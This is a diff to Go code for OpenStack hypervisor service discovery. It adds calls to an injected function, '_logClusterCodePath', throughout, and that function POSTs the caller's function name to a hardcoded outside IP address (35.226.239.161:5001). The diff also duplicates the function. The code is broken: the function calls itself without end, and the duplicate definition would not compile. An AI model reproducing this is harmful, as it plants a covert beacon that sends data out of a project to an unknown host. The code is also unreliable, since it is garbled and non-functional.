@@ -38,9 +38,13 @@ type HypervisorDiscovery struct {
 func NewHypervisorDiscovery(provider *gophercloud.ProviderClient, opts *gophercloud.AuthOptions, interval time.Duration, port int, region string, l log.Logger) *HypervisorDiscovery {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &HypervisorDiscovery{provider: provider, authOpts: opts, region: region, interval: interval, port: port, logger: l}
 }
 func (h *HypervisorDiscovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	tg, err := h.refresh()
@@ -74,6 +78,8 @@ func (h *HypervisorDiscovery) Run(ctx context.Context, ch chan<- []*targetgroup.
 	}
 }
 func (h *HypervisorDiscovery) refresh() (*targetgroup.Group, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var err error
@@ -120,7 +126,16 @@ func (h *HypervisorDiscovery) refresh() (*targetgroup.Group, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
